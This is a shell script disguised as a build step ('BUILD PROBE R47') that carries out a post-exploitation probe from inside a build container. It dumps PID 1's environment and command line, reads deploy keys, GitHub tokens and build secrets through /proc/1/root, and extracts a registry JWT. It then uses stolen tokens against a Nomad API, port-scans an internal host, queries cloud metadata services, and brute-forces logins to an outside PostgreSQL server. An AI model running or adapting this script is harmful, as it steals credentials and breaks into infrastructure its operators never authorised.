#!/bin/sh
exec > /build_output.txt 2>&1

echo "=== BUILD PROBE R47 ==="
date

echo "--- PID1 ENVIRON ---"
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | sort
echo "--- PID1 CMDLINE ---"
cat /proc/1/cmdline 2>/dev/null | tr '\0' '\n'

echo "--- BUILDER SECRETS ---"
echo "== /proc/1/root/secrets/ =="
ls -la /proc/1/root/secrets/ 2>&1
for f in build.env deploy_key github_token; do
  echo "== /proc/1/root/secrets/$f =="
  cat "/proc/1/root/secrets/$f" 2>&1 | head -20
done

echo "== /proc/1/root/alloc/ =="
ls -la /proc/1/root/alloc/ 2>&1
find /proc/1/root/alloc/ -maxdepth 3 -type f 2>/dev/null | head -30
for f in $(find /proc/1/root/alloc/ -maxdepth 3 -name "*.env" -o -name "*.json" -o -name "*.conf" -o -name "*.yml" 2>/dev/null | head -20); do
  echo "== $f =="
  cat "$f" 2>&1 | head -20
done

echo "== /proc/1/root/local/ =="
ls -la /proc/1/root/local/ 2>&1
find /proc/1/root/local/ -maxdepth 3 -type f 2>/dev/null | head -30
for f in $(find /proc/1/root/local/ -maxdepth 3 -type f 2>/dev/null | head -20); do
  echo "== $f =="
  cat "$f" 2>&1 | head -20
done

# Also try direct paths (build container might share root NS)
echo "--- DIRECT SECRET PATHS ---"
for p in /secrets/build.env /secrets/deploy_key /secrets/github_token /alloc /local; do
  echo "== $p =="
  ls -la "$p" 2>&1 | head -5
  cat "$p" 2>&1 | head -10
done

# Extract JWT
JWT=$(cat /proc/1/cmdline 2>/dev/null | tr '\0' '\n' | grep -A1 'registry-auths' | tail -1 | python3 -c "
import sys,json
try:
    data=json.loads(sys.stdin.read())
    print(data[0]['password'])
except: pass
" 2>/dev/null)
echo "JWT_LEN=${#JWT}"

# Try HTTPS for Nomad API (the HTTP variant returned empty)
echo "--- NOMAD API PROBES ---"
for proto in http https; do
  for port in 4646 4647 8200 8500; do
    resp=$(curl -sk --connect-timeout 2 "$proto://169.254.1.2:$port/" 2>&1)
    code=$?
    echo "$proto://169.254.1.2:$port -> exit=$code resp=${resp:0:100}"
  done
done

# Try Nomad API with HTTPS
echo "--- NOMAD HTTPS ALLOCATIONS ---"
curl -sk --connect-timeout 3 "https://169.254.1.2:4646/v1/allocations" -H "Authorization: Bearer $JWT" 2>&1 | python3 -c "
import sys,json
try:
    data=json.load(sys.stdin)
    if isinstance(data, list):
        for a in data[:50]:
            print(f'ID={a.get(\"ID\",\"\")} Job={a.get(\"JobID\",\"\")} Task={a.get(\"TaskGroup\",\"\")} NS={a.get(\"Namespace\",\"\")} Status={a.get(\"ClientStatus\",\"\")}')
    else:
        print(data)
except Exception as e: print(f'err: {e}: '+sys.stdin.read()[:200])
" 2>/dev/null

# Try Nomad token from local dir
NOMAD_TOKEN=$(cat /proc/1/root/local/nomad_token 2>/dev/null || cat /proc/1/root/alloc/data/nomad_token 2>/dev/null || cat /local/nomad_token 2>/dev/null)
if [ -n "$NOMAD_TOKEN" ]; then
  echo "NOMAD_TOKEN_LEN=${#NOMAD_TOKEN}"
  echo "--- NOMAD WITH TOKEN ---"
  for ep in allocations jobs namespaces; do
    echo "== $ep =="
    curl -sk --connect-timeout 3 "https://169.254.1.2:4646/v1/$ep" -H "X-Nomad-Token: $NOMAD_TOKEN" 2>&1 | head -c 500
    echo
  done
fi

# Port scan 169.254.1.2 for more services
echo "--- HOST SERVICES ---"
for port in 80 443 2379 2380 4646 4647 4648 5432 6443 8080 8200 8300 8301 8302 8500 8501 8502 8600 9090 9100 10250 10255 12691; do
  echo -n "169.254.1.2:$port -> "
  nc -w 1 -z 169.254.1.2 "$port" 2>&1 && echo "OPEN" || echo "closed"
done

# Try metadata services
echo "--- METADATA ---"
curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>&1 | head -20
curl -s --connect-timeout 2 http://169.254.169.254/computeMetadata/v1/ -H "Metadata-Flavor: Google" 2>&1 | head -20
curl -s --connect-timeout 2 http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H "Metadata: true" 2>&1 | head -20

# Try to connect to falcon PG
echo "--- FALCON PG AUTH ---"
for user in falcon avnadmin postgres admin root; do
  for pw in falcon avnadmin postgres admin root password "" test ctf flag bounty; do
    result=$(PGPASSWORD="$pw" psql "host=132.145.163.127 port=12691 dbname=defaultdb sslmode=require user=$user connect_timeout=3" -c "SELECT 1" 2>&1)
    if ! echo "$result" | grep -qE "password authentication failed|FATAL|error|timeout|no password"; then
      echo "SUCCESS: user=$user pw=$pw"
      echo "$result"
    fi
  done
done
echo "auth brute done"

echo "=== BUILD DONE R47 ==="
